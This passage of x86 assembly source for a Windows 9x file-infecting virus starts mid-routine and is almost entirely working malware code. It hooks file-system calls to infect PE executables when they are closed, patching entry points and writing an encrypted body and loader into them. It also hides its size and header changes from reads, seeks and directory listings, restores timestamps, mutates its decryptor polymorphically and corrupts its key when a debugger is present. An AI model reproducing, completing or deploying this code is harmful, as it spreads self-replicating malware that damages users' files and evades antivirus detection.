           test    eax,file_align          ; aligned right?
           jnz next_ifs_hook
           mov [ebp+FileSize],eax

           lea edx,[ebp+FileBuffer]
           call    checkfile
           jc  next_ifs_hook

           mov ecx,[edi.ir_pos]        ; ecx = position reading from
           cmp ecx,eax             ; above original filesize?
           jbe ptr_ok              ; ...
           xor eax,eax
           mov [edi.ir_length],eax
           jmp xx_ifs_ret

   ptr_ok:     mov ecx,[edi.ir_length]
           add ecx,[edi.ir_pos]
           cmp ecx,eax
           jbe size_ok

           sub eax,[edi.ir_pos]
           mov [edi.ir_length],eax

       ;/* Read is now within the original file, so manipulate data returned */

   size_ok:    xchg    ebx,esi

           push    [edi.ir_pos]
           push    [edi.ir_data]
           pop [ebp+st_data]
           pop [ebp+st_pos]

           call    next_hooker

           mov cx,[edi.ir_error]       ; check for errors
           test    cx,cx
           jnz xx_ifs_ret

   ;********************************************************
   ;*                          *
   ;* Rebuild the original PE header of the infected file  *
   ;* into a designated buffer, for stealth purposes.. *
   ;********************************************************

           pushad

           mov byte ptr [edx+15],0             ; mark header uninfected
           mov ecx,edx
           movzx   eax,word ptr [edx.IFH_SizeOfOptionalHeader] ; NT header size
           add eax,24                      ; Image file header
           add ecx,eax                     ; ECX points to first Object header in memory
           movzx   eax,word ptr [edx.IFH_NumberOfSections]
           imul    eax,eax,40
           add eax,ecx
           mov ecx,eax
           sub eax,edx                 ; EAX = size of PE header including all object headers
           add eax,stealth_table_size + 40     ; (plus the required blank entry before stealth table)
           mov [ebp+PE_SIZE],eax

       ;/* get offset in file of virus loader */

           add ecx,80

           mov eax,[ecx.PhysicalOffset]
           add eax,[ecx.PhysicalSize]
           mov [ebp+LoaderOffs],eax

           add ecx,40              ; ECX pts to end of CODE section header backup

       ;/* Restore infected section headers */

           pushad
           mov edi,[ecx]           ; EDI = PE RVA of last section header
           add edi,edx
           mov esi,ecx
           mov ecx,40
           sub esi,ecx
           sub esi,ecx
           rep movsb
           popad

           push    dword ptr [ecx+8]
           pop dword ptr [ebp+EntryPointRVA]

           pushad
           mov edi,[ecx+4]
           add edi,edx
           mov esi,ecx
           mov ecx,40
           sub esi,ecx
           rep movsb
           popad

       ;/* Restore the original PE header */

           push    [ecx.sdEntryPointRVA]
           pop [edx.NTOH_EntryPointRVA]    ; restore original EntryPoint RVA
           push    [ecx.sdImageSize]
           pop [edx.NTOH_SizeOfImage]      ; restore original imagesize
           push    [ecx.sdCodeSize]
           pop [edx.NTOH_SizeOfCode]       ; restore original codesize
           push    [ecx.sdCheckSum]
           pop [edx.NTOH_CheckSum]     ; restore original checksum

       ;/* Erase virus stealth table */

           pushad
           sub ecx,80
           xchg    edi,ecx
           xor al,al
           mov ecx,stealth_table_size      ; size of stealth table
           rep stosb
           popad
           popad


   ;********************************************************
   ;*                          *
   ;* Stealth on reading from the infected file        *
   ;********************************************************

           mov ecx,[edi.ir_length]
           test    ecx,ecx
           jz  xx_ifs_ret

           mov esi,[ebp+st_pos]
           mov ebx,[ebp+st_data]
           dec ecx

   HideByte:   ; ESI pts to current byte

       ;/* Reading inside PE header? */

           mov eax,[ebp+PE_RVA]
           cmp esi,eax
           jb  NextByte        ; byte is below PE header, so ignore it
           add eax,[ebp+PE_SIZE]
           cmp esi,eax
           jae check_loader        ; byte is after PE header, check the virus' loader in CODE section

       ;/* Stealthn one byte PE header */

           mov eax,esi
           sub eax,[ebp+PE_RVA]    ; EAX = position of byte in PE header
           lea edx,[ebp+FileBuffer]
           mov al,[edx+eax]
           mov [ebx],al
           jmp NextByte

       ;/* Stealth virus loader in CODE section on attempt to read */

   check_loader:   mov eax,[ebp+LoaderOffs]
           cmp esi,eax
           jb  NextByte
           add eax,patchsize
           cmp esi,eax
           jae NextByte

           xor al,al
           mov [ebx],al

       ;/* Check next byte in reading range */

   NextByte:   inc esi
           inc ebx
           loop    HideByte


       ;/* Leave control to next hooker in ifsmgr chain */

           jmp xx_ifs_ret
   popad_ifs_hook: popad
           jmp next_ifs_hook



   ;*********************************************************
   ;*                           *
   ;* SeekFile: Stealthn virus size on seek in file     *
   ;*********************************************************

   SeekFile:   mov [ebp+fsd_seek],edx
           xchg    ebx,esi             ; store ESI in EBX
           lea esi,[ebp+seek_ioreq]

           pushad
           xchg    esi,edi             ; ESI points to ioreq structure, EDI to our buffer
           mov ecx,size ioreq
           rep movsb
           popad

           mov [esi.ir_flags],FILE_END
           mov [esi.ir_pos],0
           push    esi
           call    edx             ; seek to end of file
           pop esi
           mov cx,[esi.ir_error]       ; check for errors
           test    cx,cx
           jnz next_ifs_hook

           mov eax,[esi.ir_pos]
           cmp eax,vsize
           jbe next_ifs_hook

           sub eax,vsize
           test    eax,file_align
           jnz next_ifs_hook

       ;/* File is padded as if it was infected. open it and verify it's an infected PE executable */

           lea edx,[ebp+FileBuffer]
           call    checkfile
           jc  next_ifs_hook



           xchg    ebx,esi             ; restore ESI, as we're calling next_hooker
           call    next_hooker

           mov cx,[edi.ir_error]       ; check for errors
           test    cx,cx
           jnz xx_ifs_ret

           mov ecx,[edi.ir_pos]
           cmp ecx,eax
           jbe xx_ifs_ret
           sub ecx,eax
           sub [edi.ir_pos],ecx
           jmp xx_ifs_ret


       ;/* Subroutine: check if file is an infected MZ PE file */

   checkfile:  pushad
           xor ecx,ecx
           mov esi,[ebp+fsd_read]
           mov eax,40h
           call    FSD             ; Read MZ header
           jc  not_ok
           cmp word ptr [edx],'ZM'
           jnz not_ok
           mov ecx,[edx+3Ch]
           cmp ecx,1000h
           ja  not_ok
           mov [ebp+PE_RVA],ecx
           mov eax,400h
           call    FSD             ; Read PE header
           jc  not_ok
           cmp word ptr [edx],'EP'
           jnz not_ok
           cmp byte ptr [edx+15],1
           jnz not_ok
           popad
           ret
   not_ok:     stc
           popad
           ret


   ;*********************************************************
   ;*                           *
   ;* EnumHandle: return original filesize,         *
   ;*********************************************************

   EnumHandle: call    next_hooker
           mov esi,[edi.ir_data]
           mov eax,[esi.bhfi_nFileSizeLow] ; EAX holds filesize
           sub eax,vsize       ; subtract virus' aligned size
           test    eax,file_align
           jnz xx_ifs_ret
           mov [esi.bhfi_nFileSizeLow],eax
   xx_ifs_ret: xor eax,eax
           mov dr0,eax
           jmp exit_ifs_hook


   ;*********************************************************
   ;*                           *
   ;* Store the FSD that is to be called for writing and    *
   ;* filetime (used while infecting).          *
   ;*********************************************************


   FileWrite:  mov [ebp+fsd_write],edx
           jz  next_ifs_hook
   FileTime:   mov [ebp+fsd_filetime],edx
           jz  next_ifs_hook

   ;*********************************************************
   ;*                           *
   ;* FindFirst and FindNext filesize stealth,      *
   ;*********************************************************

   FindFile:
           call    next_hooker
           mov esi,[edi.ir_data]
           mov eax,[esi.nFileSizeLow]      ; EAX holds filesize
           sub eax,vsize       ; subtract virus' aligned size (virus size/103+1*103)
           test    eax,file_align
           jnz xx_ifs_ret
           mov [esi.nFileSizeLow],eax
           jmp xx_ifs_ret

   ;*********************************************************
   ;*                           *
   ;* Open file: set read/write access to all opened    *
   ;* files.                        *
   ;*********************************************************


       ;/* Set read/write access to the opened file, so we can infect it on closing */

   FileOpen:   test    word ptr [edi.ir_options],ACTION_OPENEXISTING
           jz      next_ifs_hook
           mov [edi.ir_flags],ACCESS_READWRITE or ACCESS_EXECUTE   ; full access...

           jmp next_ifs_hook





   ;********************************************************
   ;*                          *
   ;* Infect closing files by writing virus to the     *
   ;* open handle (before closing ofcourse)        *
   ;********************************************************

       ;/* Check if we have both the read and write FSD functions stored */

   FileClose:  mov esi,[ebp+fsd_read]
           test    esi,esi
           jz  ret_hook
           mov ebx,[ebp+fsd_write]
           test    ebx,ebx
   ret_hook:   jz  next_ifs_hook
           cmp [edi.ir_ppath],0FFFFFBBBh   ; is IO request is valid?
           jnz next_ifs_hook

       ;/* Check if the closing file is an MZ executable */

           xor ecx,ecx             ; read from position 0
           lea edx,[ebp+FileBuffer]        ; read into this buffer
           mov eax,60h             ; length of buffer to read
           call    FSD
           jc  next_ifs_hook

   IF DEBUG
           cmp dword ptr [edx],'xxZM'      ; prepared goat file?
   ELSE
           cmp word ptr [edx],'ZM'     ; MZ executable?
   ENDIF


           jnz next_ifs_hook           ; return if not..

       ;/* Get the file's "last modified" timestamp */

           pushad
           mov ebx,[ebp+fsd_filetime]
           test    ebx,ebx
           jz  forget_time
           lea eax,[ebp+our_ioreq]
           mov [eax.ir_flags],GET_MODIFY_DATETIME
           push    [edi.ir_rh]
           pop [eax.ir_rh]
           push    [edi.ir_fh]
           pop [eax.ir_fh]
           push    eax
           call    ebx             ; get last modified time
           pop eax
           push    [eax.ir_aux2]
           pop [ebp+ddFileTime]
   forget_time:    popad

   ;_________________________________ (infection algorithm)

       ;/* Check if the closing file is an 32-bit Portable Executable */

           mov ecx,[edx+3Ch]           ; get pointer to NewExe header
           cmp ecx,1000h           ; corrupt pointer?
           ja  next_ifs_hook           ; return if corrupt.
           mov [ebp+PE_RVA],ecx
           mov eax,800h            ; read 800h bytes at offset ECX into EDX buffer
           call    FSD             ; using direct FSD access..
           jc  next_ifs_hook
           cmp word ptr [edx],'EP'     ; is it a PE header?
           jnz next_ifs_hook           ; return if not 32-bit Portable Executable
           cmp byte ptr [edx+15],0     ; infected?
           jnz next_ifs_hook

       ;/* Check if a library file (as in DLL) */

   IF AVOIDDLL
           mov ax,[edx.IFH_Characteristics]
           or  ax,IMAGE_FILE_DLL
           jz  next_ifs_hook
   ENDIF
           inc byte ptr [edx+15]       ; mark header infected

       ;/* Gather information from PE header and null checksum */

           push    [edx.IFH_TimeDateStamp]     ; store time stamp (for encryption, as a part of the key)
           pop [ebp+CryptKey]
           push    [edx.NTOH_FileAlignment]    ; store file alignement
           pop [ebp+Alignement]
           push    [edx.NTOH_EntryPointRVA]    ; EntryPoint RVA...
           pop [ebp+EntryPointRVA]
           push    [edx.NTOH_SizeOfCode]       ; code size..
           pop [ebp+CodeSize]
           push    [edx.NTOH_SizeOfImage]      ; ImageSize
           pop [ebp+ImageSize]
           push    [edx.NTOH_CheckSum]     ; Checksum
           pop [ebp+CheckSum]
           xor eax,eax
           mov [edx.NTOH_CheckSum],eax     ; Null checksum (linker default)

       ;/* Locate the Object headers in PE structure */

           mov esi,[edx.NTOH_EntryPointRVA]    ; ESI holds EP RVA
           movzx   eax,word ptr [edx.IFH_SizeOfOptionalHeader]     ; EAX = NT header size
           pushad
           add eax,24              ; + Image file header
           movzx   ecx,word ptr [edx.IFH_NumberOfSections]     ; get nr. of sections
           inc ecx             ; +1 empty section
           imul    ecx,ecx,40          ; multiply it with section header size
           add eax,ecx             ; EAX = RVA/offset to virus stealth data area (from PE header)
           add eax,edx             ; EAX pts to virus stealth data area in memory
           mov [ebp+StealthData],eax
           popad
           sub eax,16              ; EAX = Object Table position -40
           mov ecx,edx
           add ecx,eax
           add edx,eax

       ;/* Check if host PE header contains anough free space for our stealth table */

           pushad
           mov esi,[ebp+StealthData]
           mov ecx,stealth_table_size
   chk_table_space:lodsb
           test    al,al
           jnz stack_fix_3         ; Exit with stackfix if PE header does not contain a cave
           loop    chk_table_space         ; big anough for our stealth table.
           popad

       ;/* Locate CODE section, wich is, the section EntryPoint RVA points inside */

   find_code:  add edx,40
           cmp dword ptr [edx.ObjectName],0
           jz  next_ifs_hook
           mov eax,[edx.RVA]           ; get start RVA of section
           cmp esi,eax
           jb  find_code           ; try again if EntryPoint RVA is below section RVA
           add eax,[edx.PhysicalSize]      ; get end RVA of section
           cmp esi,eax
           ja  find_code           ; try again if EntryPoint RVA points to after end RVA

       ;/* Check if CODE section contains a big anough cave for our loader */

           mov eax,[edx.VirtualSize]
           sub eax,[edx.PhysicalSize]
           cmp eax,patchsize           ; is the virus' patch size bigger than gap between Vsize and Psize?
           jb  next_ifs_hook           ; exit infection if cave in CODE section is too small

       ;/* Get last section header */

           push    esi
           push    edi
           xor esi,esi
   get_last_sec:   add ecx,40              ; get first/next section header
           cmp [ecx.Flags],0           ; reached end of section headers?
           je  got_last_hdr
           cmp esi,[ecx.PhysicalOffset]    ; is ESI below this offset
           ja  get_last_sec            ; if not, check next
           mov esi,[ecx.PhysicalOffset]    ; ESI = Offset of this section
           mov edi,ecx             ; EDI points to this section header
           jmp get_last_sec
   got_last_hdr:   xchg    ecx,edi
           pop edi
           pop esi
           xchg    ebx,esi             ; ESI holds FSD write function
                               ; EDX pts to CODE section header
                               ; ECX pts to last section header

       ;/* Store original copies of infected object headers and PE header values in virus' stealth table */

           pushad
           push    edx
           push    ecx
           mov esi,ecx
           mov edi,[ebp+StealthData]
           mov ecx,40
           rep movsb
           mov esi,edx
           mov ecx,40
           rep movsb
           lea esi,[ebp+FileBuffer]
           pop eax
           sub eax,esi
           stosd                   ; store PE RVA of last section
           pop eax
           sub eax,esi
           stosd                   ; store PE RVA of CODE section
           mov eax,[esi.NTOH_EntryPointRVA]
           stosd
           lea esi,[ebp+ImageSize]
           mov ecx,12
           rep movsb
           popad

       ;/* Set write bit to CODE section (to write decryption) */

           or  dword ptr [edx.Flags],IMAGE_SCN_MEM_WRITE

       ;/* Set new EntryPoint RVA */

           lea ebx,[ebp+FileBuffer]        ; EBX pts to PE header
           mov eax,[edx.RVA]           ; EAX holds RVA of code section
           add eax,[edx.PhysicalSize]      ; EAX holds our new EntryPoint RVA
           pushad
           sub eax,[ebx.NTOH_EntryPointRVA]    ; EAX = New EP RVA - Old EP RVA
           mov [ebp+HostPtr],eax       ; store difference between virus loader RVA and old EP RVA
           popad
           mov [ebx.NTOH_EntryPointRVA],eax    ; Set new EntryPoint RVA


       ;/* Store offset where to write virus loader as we'll need it later.. */

           mov eax,[edx.PhysicalOffset]
           add eax,[edx.PhysicalSize]
           push    eax             ; store offset to write virus loader on stack

       ;/* Set new PhysicalSize for CODE section and update flags */

           add [edx.PhysicalSize],patchsize    ; set CODE sections new size
           or  [edx.Flags],IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ

           mov eax,[ecx.RVA]
           add eax,[ecx.VirtualSize]       ; EAX holds RVA of virus body
           sub eax,[ebx.NTOH_EntryPointRVA]    ; - Virus loader RVA = our DiffPtr (for exeption hook in loader)
           mov [ebp+DiffPtr],eax

       ;/* Get offset where to write virus */

           mov eax,[ecx.PhysicalOffset]
           add eax,[ecx.VirtualSize]
           push    eax             ; store offset to write virus body

       ;/* increase last sections' PhysicalSize */

           mov eax,[ecx.VirtualSize]
           add eax,vsize
           mov [ecx.PhysicalSize],eax  ; set new size for virus' section


       ;/* Update VirtualSize in last section header, ImageSize and CodeSize in PE header */

           pushad
           add [ecx.VirtualSize],virus_aligned
           lea eax,[ebp+FileBuffer]
           mov edx,[eax.RVA]
           add edx,[ecx.VirtualSize]
           mov [eax.NTOH_SizeOfImage],edx
           cmp [eax.NTOH_SizeOfCode],0
           je  @@jabba
           add [eax.NTOH_SizeOfCode],patchsize
   @@jabba:    popad

       ;/* Set new flags for virus' section */

           or  [ecx.Flags],IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ

       ;/* write edited PE header */

           mov eax,800h            ; EAX = size of buffer to write
           mov ecx,[ebp+PE_RVA]        ; ECX holds position of to where to write the data
           lea edx,[ebp+FileBuffer]
           call    FSD
           jc  stack_fix_2

       ;/* Generate new encryption keys, mutate virus decryptor, and encrypt
       ;   virus main body in 2 layers. */

           pushad
           call    MutateCryptors
           call    MutateHeader
           VxdCall VMM_Get_System_Time     ; returns the time, in milliseconds, since windoze started
           bswap   eax             ; in case the counter is low, swap some values..
           neg eax             ; ....
           mov ecx,[ebp+CryptKey]      ; get previously stored key
           add eax,ecx
           mov [ebp+TopCryptKey],eax
           rcr ecx,1
           mov edx,[ebp+MainTopLayerKey]
           xor ecx,edx
           add ecx,edx
           mov [ebp+MainTopLayerKey],ecx
           xor eax,ecx             ; xor millisecond counter with PE TimeDate stamp
           bswap   eax
           xchg    eax,ebx             ; EBX holds our encryption key
           mov [ebp+CryptKey],ebx
           pushad
           VxdCall VMM_Get_System_Time
           cmp al,10h
           jae loops_ok
           sub al,10h
   loops_ok:   mov [ebp+PolyLoops],al
           popad
           call    ProcessKey
           lea esi,[ebp+vstart]
           lea edi,[ebp+CryptMirror]
           push    edi
           mov ecx,vsize
           rep movsb
           pop esi
           push    esi
           add esi,(encrypted - vstart)    ; ESI points to start of encrypted virus in mirror mem.
           call    poly_encrypt
           pop esi
           call    SimpleCrypt
           popad

       ;/* Write encrypted code to file */

           mov eax,vsize
           pop ecx             ; offset to write virus body
           lea edx,[ebp+CryptMirror]
           call    FSD
           jc  stack_fix_1

       ;/* write virus loader into CODE section */

           pop ecx             ; offset to write virus loader
           mov eax,patchsize


   IF TOPCRYPT
           pushad
           call    TopCryptEnc
           popad
           lea edx,[ebp+LoaderBuffer]
   ELSE
           lea edx,[ebp+loader]
   ENDIF
           call    FSD
           jc  nextifs

   ;_________________________________ (end of infection algorithm)

       ;/* Restore original last modified time */

           pushad
           mov ebx,[ebp+fsd_filetime]
           test    ebx,ebx
           jz  __forget_time
           mov eax,[ebp+ddFileTime]
           test    eax,eax
           jz  __forget_time
           push    eax
           lea eax,[ebp+our_ioreq]
           pop [eax.ir_aux2]
           mov [eax.ir_flags],SET_MODIFY_DATETIME
           push    [edi.ir_rh]
           pop [eax.ir_rh]
           push    [edi.ir_fh]
           pop [eax.ir_fh]
           push    eax
           call    ebx
           pop eax
   __forget_time:  popad


       ;/* Return to next IFS hook.. (some stackfixes) */

           jmp nextifs
   stack_fix_2:    add esp,4
   stack_fix_1:    add esp,4
           jmp nextifs
   stack_fix_3:    popad
   nextifs:    jmp next_ifs_hook


   ;********************************************************
   ;*                          *
   ;* Our function for calling FSD. returns carry flag set *
   ;* if error                     *
   ;********************************************************

   FSD:        pushad
           clc
           push    eax
           lea eax,[ebp+our_ioreq]
           pop [eax.ir_length]
           push    [edi.ir_rh]
           pop [eax.ir_rh]
           push    [edi.ir_fh]
           pop [eax.ir_fh]
           mov [eax.ir_pos],ecx
           mov [eax.ir_data],edx
           push    eax
           call    esi             ; read the file using direct FSD access
           pop eax
           mov cx,[eax.ir_error]
           test    cx,cx
           jz  no_fsd_error
           stc
   no_fsd_error:   popad
           ret






   comment     $

   *** Sanatral mutation engine ***
   #1 change the dummy byte at "@dummy" to a random one
   #2 change the pop-push bytes at "@stackregz" to eax,ebx,ecx,edx,esi,edi on random basis,
      and change the instructions at "@xchgfix" and at "@addfix" with respective register.
   #3 change the register used in "@ifix1" (mov REG,esp -> call REG) to any of the register-
      options in #2 (won't affect delta)
   #4 change the 3 bytes at "@ifix2" to "add esp,4", or "pop eax,,nop,,nop".
   #5 change the 6 bytes at "@ifix3" to either "mov ebx,(dword-key) ,, nop" or "push (dword-key),,
      pop ebx" (key offset will not be affected)
   #6 change the 5 bytes at "@ifix4" to either "mov ecx,(TopCryptSize-3)" or
      "push (TopCryptSize - 3),,pop ecx,,nop,,nop"
   #7 change word at "@ifix5" to either "mov edi,esi" or "push esi,,pop edi"
   #8 change 5 bytes at "@ifix6" to "mov eax,[esi],,add esi,4" or "losd,,nop,,nop,,nop,,nop"
   #9 change 3 bytes at "@ifix7" to either "sub esi,3" or "dec esi,,dec esi,,dec esi"
   #10 change word at "@ifix8" to either "mov [edi],eax", or "stosd,,nop" (won't need to add to
       edi since we won't use it)

   finally, mutate the encryption and decryption algorithms for TopCrypt.
           $


   GetRandomEAX:   VxdCall VMM_Get_System_Time
           neg eax
           xor eax,[ebp+CryptKey]
           bswap   eax
           xor eax,[ebp+MutatedKey]
           add eax,[ebp+CryptKey]
           ret
       ;#### STEP 1 #####
   MutateHeader:   pushad
           call    GetRandomEAX
           mov byte ptr [ebp+@dummy],al
       ;#### STEP 2 #####
           pushad
       ;/* get a random counter between 0 and 4 */
           xor ecx,ecx
           mov cl,al
   substep2:   sub cl,5
           cmp cl,5
           jae substep2
       ;/* get table entry for the random counter */
           imul    ecx,ecx,t1entrysize
           lea esi,[ebp+MutationTable1]
           add esi,ecx
       ;/* replace instructions with new from table entry */
           lea edi,[ebp+@stackregz]
           lodsw
           stosw
           PUSH ESI
           lea edi,[ebp+@addfix]
           mov ecx,3
           rep movsb
           POP ESI
           ADD ESI,3
           lea edi,[ebp+@xchgfix]
           lodsw
           stosw
           popad
       ;#### STEP 3 #####
           shr eax,4
       ;/* get a random counter between 0 and 4 */
           pushad
           xor ecx,ecx
           mov cl,al
   substep1:   sub cl,5
           cmp cl,5
           jae substep1
       ;/* get table entry for the random counter */
           imul    ecx,ecx,t2entrysize
           lea esi,[ebp+MutationTable2]
           add esi,ecx
       ;/* replace instructions with new from table entry */
           lea edi,[ebp+@ifix1]
           mov ecx,t2entrysize
           rep movsb
           popad
           shr eax,4
       ;#### STEP 4 #####
           pushad
   step4_comb1:    lea esi,[ebp+MutationTable3]
           cmp al,90h
           ja  step4_comb2
           add esi,3
   step4_comb2:    lea edi,[ebp+@ifix2]
           mov ecx,3
           rep movsb
           popad
       ;#### STEP 5 #####
           shr eax,4
           pushad
           lea esi,[ebp+MutationTable4]
           cmp al,90h
           ja  step5_comb2
           add esi,6
   step5_comb2:    lea edi,[ebp+@ifix3]
           mov ecx,6
           rep movsb
           popad
       ;#### STEP 6 #####
           call    GetRandomEAX
           pushad
   step6_comb1:    lea esi,[ebp+MutationTable5]
           cmp al,90h
           ja  step6_comb2
           add esi,5
   step6_comb2:    lea edi,[ebp+@ifix4]
           mov ecx,5
           rep movsb
           popad
       ;#### STEP 7 ####
           shr eax,4
           pushad
   step7_comb1:    lea esi,[ebp+MutationTable6]
           cmp al,80h
           ja  step7_comb2
           add esi,2
   step7_comb2:    lea edi,[ebp+@ifix5]
           lodsw
           stosw
           popad
       ;#### STEP 8 ####
           shr eax,4
           pushad
   step8_comb1:    lea esi,[ebp+MutationTable7]
           cmp al,90h
           ja  step8_comb2
           add esi,5
   step8_comb2:    lea edi,[ebp+@ifix6]
           mov ecx,5
           rep movsb
           popad
       ;#### STEP 9 ####
           shr eax,4
           pushad
   step9_comb1:    lea esi,[ebp+MutationTable8]
           cmp al,90h
           ja  step9_comb2
           add esi,3
   step9_comb2:    lea edi,[ebp+@ifix7]
           mov ecx,3
           rep movsb
           popad
       ;#### STEP 10 ####
           shr eax,4
   step10_comb1:   lea esi,[ebp+MutationTable9]
           cmp al,90h
           ja  step10_comb2
           add esi,2
   step10_comb2:   lea edi,[ebp+@ifix8]
           lodsw
           stosw
           popad
           ret
       ;/*** Mutation tables ***/
   MutationTable1: pop ebx
           push    ebx
           add ebx,(TopCrypt-@addfix)
           xchg    ebx,esi
   t1entrysize equ $ - MutationTable1
           pop ecx
           push    ecx
           add ecx,(TopCrypt-@addfix)
           xchg    ecx,esi
           pop edx
           push    edx
           add edx,(TopCrypt-@addfix)
           xchg    edx,esi
           pop esi
           push    esi
           add esi,(TopCrypt-@addfix)
           xchg    esi,esi
           pop edi
           push    edi
           add edi,(TopCrypt-@addfix)
           xchg    edi,esi
   MutationTable2: mov ebx,esp
           call    ebx
   t2entrysize equ $ - MutationTable2
           mov ecx,esp
           call    ecx
           mov edx,esp
           call    edx
           mov esi,esp
           call    esi
           mov edi,esp
           call    edi
   MutationTable3: add esp,4
           pop eax
           nop
           nop
   MutationTable4: mov ebx,12345678h
           nop
           push    12345678h
           pop ebx
   MutationTable5: mov ecx,(TopCryptSize-3)
           push    (TopCryptSize - 3)
           pop ecx
           nop
           nop
   MutationTable6: mov edi,esi
           push    esi
           pop edi
   MutationTable7: mov eax,[esi]
           add esi,4
           lodsd
           nop
           nop
           nop
           nop
   MutationTable8: sub esi,3
           dec esi
           dec esi
           dec esi
   MutationTable9: stosd
           nop
           mov [edi],eax
   dec_table:  xor eax,ebx
           rol eax,1
           add eax,ebx
           xor eax,ebx
           bswap   eax
           sub eax,ebx
           xor eax,ebx
           ror eax,1
           bswap   eax
           xor eax,ebx
           add eax,ebx
           rol eax,1
           xor eax,ebx
           bswap   eax
   cr_table_size   equ $ - dec_table
   cr_table_nr equ (cr_table_size / 2)
           bswap   eax
           xor eax,ebx
           ror eax,1
           sub eax,ebx
           xor eax,ebx
           bswap   eax
           rol eax,1
           xor eax,ebx
           add eax,ebx
           bswap   eax
           xor eax,ebx
           sub eax,ebx
           ror eax,1
           xor eax,ebx
   enc_table:
   GenerateAlgo:   pushad
           call    GetRandomEAX
   tbl_loop:   sub al,cr_table_nr-3
           cmp al,cr_table_nr-3
           jae tbl_loop
           shl eax,24
           shr eax,24
           add eax,eax
           lea esi,[ebp+dec_table]
           add esi,eax
           pushad
           lea edi,[ebp+dec_algo]
           mov ecx,6
           rep movsb
           popad
           lea esi,[ebp+enc_table-6]
           sub esi,eax
           lea edi,[ebp+enc_algo]
           mov ecx,6
           rep movsb
           popad
           ret

       ;/* A simple addon for mutating all encryptions and decryptions some */

   MutateCryptors: call    GenerateAlgo
           pushad
           lea esi,[ebp+enc_algo]
           lea edi,[ebp+simple_enc]
           mov ecx,6
           rep movsb
           lea esi,[ebp+dec_algo]
           lea edi,[ebp+simple_dec]
           mov ecx,6
           rep movsb
           popad
           call    GenerateAlgo
           pushad
           lea esi,[ebp+enc_algo]
           lea edi,[ebp+main_enc]
           mov ecx,6
           rep movsb
           lea esi,[ebp+dec_algo]
           lea edi,[ebp+main_dec]
           mov ecx,6
           rep movsb
           popad
           call    GenerateAlgo
           ret











       ;/* 32-bit main encryption, 16 to 255 layers */

   poly_encrypt:   xor ecx,ecx
           mov cl,byte ptr [ebp+PolyLoops]
   encloop2:   ror ebx,1
           bswap   ebx
           neg ebx
           add ebx,[ebp+CryptKey]
           pushad
           mov ecx,encryptedsize-4
   encrypt_dword:  pushad
           mov edi,esi
           lodsd
           xor eax,ebx
           sub eax,ebx
           neg eax
           ror eax,1
           bswap   eax
           xor eax,ebx
           not eax
           xor eax,ebx
           bswap   ebx
           xor eax,ebx
           bswap   ebx
   main_enc:   db  6 dup (90h)
           ror eax,3
           add eax,ebx
           xor eax,ebx
           stosd
           popad
           inc esi
           loop    encrypt_dword
           popad
           loop    encloop2
           ret

   ;_________________________________

   ProcessKey: pushad
           xor ecx,ecx
           mov cl,byte ptr [ebp+PolyLoops]
   rorloop:    ror ebx,1           ; ror shift key 16 to 255 times to match our encryption
           bswap   ebx
           neg ebx
           add ebx,[ebp+CryptKey]
           loop    rorloop
           mov [ebp+MutatedKey],ebx
           popad
           ret

   encryptedsize   equ $ - encrypted       ; end of encrypted body (polymorphic)

   ;_________________________________


       ;/* 32-bit main decryptor */

   CryptKey    dd  ?

   poly_decrypt:   mov esp,[esp+8]             ; gets the ESP when SEH was set
           pop dword ptr fs:[0]
           add esp,4
           popad                       ; restore registers


           pushad
   getkey:     mov ebx,00000000h       ; EBX holds decryptor key
   MutatedKey  equ dword ptr [$-4]
           mov ecx,fs:[20h]
           jecxz   dcloop1
           rcr ebx,3           ; corrupt decryptor key, we're being debugged... results in that the decryptor
   dcloop1:    pushad              ; loop will turn into an infinite loop and hang execution ;)
           mov ecx,encryptedsize-4
           add esi,encryptedsize-4-1

   decrypt_dword:  pushad
           mov edi,esi
           lodsd
           xor eax,ebx
           sub eax,ebx
           rol eax,3
   main_dec:   db  6 dup (90h)
           bswap   ebx
           xor eax,ebx
           bswap   ebx
           xor eax,ebx
           not eax
           xor eax,ebx
           bswap   eax
           rol eax,1
           neg eax
           add eax,ebx
           xor eax,ebx
           stosd
           popad
           dec esi
           loop    decrypt_dword
           popad

       ;/* Mutate key backwards (compared to the encryption algo.) */

           sub ebx,[ebp+CryptKey]
           neg ebx
           bswap   ebx
           rol ebx,1           ; rol shift key one step back towards the original first-layer key..
           cmp ebx,[ebp+CryptKey]  ; does our result match the original key?
           jnz dcloop1         ; continue decrypting if not (16 to 255 loops)
           popad
   end_decrypt:    jmp install



   lsize   equ $ - vstart



   ;********************************************************
   ;*                          *
   ;* Data buffering memory                *
   ;********************************************************

   data:
   CryptMirror db  2000h dup (0)
   ;ZeroBuffer db  2000h dup (0)
   FileBuffer  db  2000h dup (?)
   PE_RVA      dd  ?
   PE_SIZE     dd  ?
   LoaderOffs  dd  ?
   fsd_read    dd  ?
   fsd_write   dd  ?
   fsd_seek    dd  ?
   fsd_filetime    dd  ?
   our_ioreq   ioreq   <?>
   seek_ioreq  ioreq   <?>
   Alignement  dd  ?
   StealthData dd  ?
   EntryPointRVA   dd  ?
   ImageSize   dd  ?
   CodeSize    dd  ?
   CheckSum    dd  ?
   ddFileTime  dd  ?
   FileSize    dd  ?
   PolyLoops   db  ?
   st_data     dd  ?
   st_pos      dd  ?
   LoaderBuffer    db  (patchsize + 10) dup (?)
   end_data:
   ends
   end start
